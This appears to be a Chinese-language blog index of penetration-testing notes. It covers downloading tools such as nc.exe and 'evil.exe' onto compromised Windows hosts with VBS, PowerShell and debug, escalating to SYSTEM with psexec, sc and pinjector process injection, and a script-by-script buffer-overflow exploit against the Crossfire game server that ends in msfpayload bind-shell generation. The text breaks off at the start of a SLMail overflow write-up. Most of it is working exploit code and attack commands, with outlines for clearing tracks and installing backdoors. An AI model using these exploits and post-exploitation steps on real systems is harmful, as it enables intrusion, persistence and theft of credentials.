&gt;&gt; wget.vbs</span><br></pre></td></tr></table></figure><ul><li><code>cscript wget.vbs http://192.168.254.117/nc.exe nc.exe</code></li></ul><h4 id="使用POWERSHELL传输文件"><a href="#使用POWERSHELL传输文件" class="headerlink" title="使用POWERSHELL传输文件"></a><strong>使用POWERSHELL传输文件</strong></h4><ul><li>Wget.ps1  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$storageDir &#x3D; $pwd</span><br><span class="line">$webclient &#x3D; New-Object System.Net.WebClient</span><br><span class="line">$url &#x3D; &quot;http:&#x2F;&#x2F;192.168.254.$&#x2F;evil.exe&quot;</span><br><span class="line">$file &#x3D; &quot;new-exploit.exe&quot;</span><br><span class="line">$webclient.DownloadFile($url,$file)</span><br></pre></td></tr></table></figure></li><li><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -Nonlnteractive -NoProfile -File wget.pas1</code></li></ul><h4 id="使用DEBUG传输文件"><a href="#使用DEBUG传输文件" class="headerlink" title="使用DEBUG传输文件"></a><strong>使用DEBUG传输文件</strong></h4><ul><li>Debug<ul><li>汇编,反汇编</li><li>16进制dump工具</li><li>64k字节</li></ul></li><li>upx压缩文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wine exe2bat.exe nc.exe nc.hex</span><br><span class="line">debug&lt;nc.hex</span><br><span class="line">copy 1.dll nc.exe</span><br></pre></td></tr></table></figure><ul><li>提权</li><li>擦除攻击痕迹</li><li>安装后门<ul><li>持久化控制</li><li>Dump密码</li><li>内网渗透</li></ul></li><li>后漏洞利用阶段<ul><li>最大的挑战–防病毒软件</li><li>使用合法的远程控制软件</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wine </tag>
            
            <tag> kali </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地提权</title>
      <link href="/2015/02/03/Exploits/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
      <url>/2015/02/03/Exploits/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><ul><li>已实现本地低权限账号登录<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获取更高权限<ul><li>实现对目标进一步控制</li></ul></li><li>系统账号之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登录时获取权限令牌</li><li>服务账号无需用户登录已在后台启动服务<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user</span><br><span class="line">Administrator</span><br><span class="line">System</span><br><span class="line"></span><br><span class="line">net user owl *#修改密码</span><br><span class="line">net user#查看用户账号</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h4><pre><code>userRoot</code></pre><h4 id="Administrator提权为SYSTEM"><a href="#Administrator提权为SYSTEM" class="headerlink" title="Administrator提权为SYSTEM"></a>Administrator提权为SYSTEM</h4><ul><li>Windows system账号<ul><li>系统设置管理功能</li><li>SysInternal Suite<ul><li><code>https://docs.microsoft.com/zh-cn/sysinternals/downloads/</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">psexec -i -s -d taskmgr</span><br><span class="line">at 19:39 &#x2F;interactive cmd#win10已弃用at,改用sc和schtasks</span><br><span class="line">sc Create syscmd binPath&#x3D;&quot;cmd &#x2F;K start&quot; type&#x3D;own type&#x3D;interact</span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><pre><code>隐蔽痕迹pinjector.exe    http://www.tarasco.org/security/Process_Injector/pinjector.exe -l    #查看可注入进程pinjecter.exe -p 3012 cmd 6666 #将CMD注入到PID为3012的进程,并开放端口6666</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> pinjector </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux溢出测试</title>
      <link href="/2014/08/20/Buffer_Overflow/linux%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/"/>
      <url>/2014/08/20/Buffer_Overflow/linux%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<ul><li><strong>Crossfire</strong><ul><li>多人在线RPG游戏</li><li>1.9.0版本接受入站socket连接时存在缓冲区溢出漏洞</li></ul></li><li>调试工具<ul><li>edb</li></ul></li><li>运行平台<ul><li>kali i486虚拟机</li></ul></li></ul><p><strong>解压</strong></p><pre><code>/usr/gamestar zxpf crossfire.tar.gz</code></pre><p><strong>调试</strong></p><pre><code>edb --run /usr/games/crossfire/bin/crossfire</code></pre><p><strong>python脚本</strong>: <code>01.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host=<span class="string">"127.0.0.1"</span></span><br><span class="line">crash=<span class="string">"\x41"</span>*<span class="number">4379</span></span><br><span class="line">buffer=<span class="string">"\x11(setup sound "</span>+crash+<span class="string">"\x90\x00#"</span></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Sending evil buffer..."</span></span><br><span class="line">s.connect((host,<span class="number">13327</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Payload Sent!"</span></span><br></pre></td></tr></table></figure><p><strong>唯一字符串识别EIP精确位置</strong></p><pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379 #生成4379个唯一字符串</code></pre><p><strong>python脚本</strong> <code>02.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host=<span class="string">"127.0.0.1"</span></span><br><span class="line">crash=<span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp"</span></span><br><span class="line">buffer=<span class="string">"\x11(setup sound "</span>+crash+<span class="string">"\x90\x00#"</span></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Sending evil buffer..."</span></span><br><span class="line">s.connect((host,<span class="number">13327</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Payload Sent!"</span></span><br></pre></td></tr></table></figure><p><strong>计算EIP寄存器内存地址ASCII码在2700唯一字符串中的偏移量</strong></p><pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 463670464368</code></pre><p><strong>python脚本</strong>: <code>03.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host=<span class="string">"127.0.0.1"</span></span><br><span class="line"><span class="comment">#crash='A'*4368+'B'*4+'C'*7</span></span><br><span class="line">crash=<span class="string">'A'</span>*<span class="number">4368</span>+<span class="string">'B'</span>*<span class="number">4</span>+<span class="string">'\x83\xc0\x0c\xff\xe0\x90\x90'</span></span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"\x11(setup sound "</span>+crash+<span class="string">"\x90\x00#"</span></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Sending evil buffer..."</span></span><br><span class="line">s.connect((host,<span class="number">13327</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Payload Sent!"</span></span><br></pre></td></tr></table></figure><p><strong>思路:</strong></p><ul><li><p>第一阶段shellcode</p><ul><li>ESP跳转到EAX</li><li>偏移12个字节</li></ul></li><li><p>setup sound shellcode2</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;masm_shell.rb</span><br><span class="line">add eax,12</span><br><span class="line">jmp eax</span><br><span class="line">\x83\xc0\x0c\xff\xe0\x90\x90</span><br></pre></td></tr></table></figure></li><li><p>查找坏字符</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x00\x0a\0d\x20</span><br><span class="line">ESP跳转地址</span><br><span class="line">Opcode serach</span><br><span class="line">crash&#x3D;&quot;\41&quot;*4368+&quot;\x97\x45\x13\x08&quot;+&quot;x83\xc0\x0c\xff\xe0\x90\x90&quot;</span><br></pre></td></tr></table></figure></li><li><p>设置断点(0x08134597)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EIP----08134597</span><br><span class="line">jmp esp</span><br><span class="line">add eax,12</span><br><span class="line">jmp eax</span><br><span class="line">msfpayload linux&#x2F;x86&#x2F;shell bind tcp lport&#x3D;4444 R | msfencode -b &quot;\x00\x0a\x0d\x20&quot; #生成shellcode</span><br></pre></td></tr></table></figure></li></ul><p><strong>python脚本</strong>: <code>05.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host=<span class="string">"127.0.0.1"</span></span><br><span class="line"><span class="comment">#crash='A'*4368+'B'*4+'C'*7</span></span><br><span class="line">shellcode=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span>+</span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span>+</span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span>+</span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span>+</span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span>+</span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span>+</span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span>+</span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span>+</span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span>+</span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span>+</span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span>+</span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span>+</span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span>+</span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span>+</span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span>+</span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">crash=shellcode+<span class="string">'A'</span>*(<span class="number">4368</span><span class="number">-78</span>)+<span class="string">"\x97\x45\x13\x08"</span>+<span class="string">"x83\xc0\x0c\xff\xe0\x90\x90"</span></span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"\x11(setup sound "</span>+crash+<span class="string">"\x90\x00#"</span></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Sending evil buffer..."</span></span><br><span class="line">s.connect((host,<span class="number">13327</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Payload Sent!"</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 缓冲区溢出 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows缓冲区溢出测试</title>
      <link href="/2014/08/11/Buffer_Overflow/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/"/>
      <url>/2014/08/11/Buffer_Overflow/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a><strong>缓冲区溢出</strong></h4></blockquote><p>程序漏洞从哪里来<br>    罪恶的根源:变量<br>    数据与代码边界不清<br>    最简漏洞原理—-shell脚本漏洞</p><p>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被”撑爆”,从而覆盖了相邻内存区域的数据；</p><p>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果.</p><p>如何发现漏洞<br>    源码审计<br>    逆向工程<br>    模糊测试<br>        向程序堆栈半随机的数据,根据内存变化判断溢出<br>        数据生成器:生成随机,半随机数据<br>        测试工具:识别溢出漏洞</p><blockquote><h4 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h4></blockquote><p>FUZZER<br>SLMail 5.5.0 Mail Server<br>    POP3 PASS 命令存在缓冲区溢出漏洞<br>    无需身份验证实现远程代码执行<br>    win7++ 已升级DEP ASLR<br>        DEP:阻止代码从数据页被执行<br>        ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化</p><p><code>ImmunityDebugger_1_85setup.exe</code><br><code>mana.py</code></p><p>FUZZING<br>    nc 110端口<br>    了解未知协议<br>        Wireshark<br>        RFC</p><blockquote><h4 id="python代码01-py"><a href="#python代码01-py" class="headerlink" title="python代码01.py"></a>python代码<code>01.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 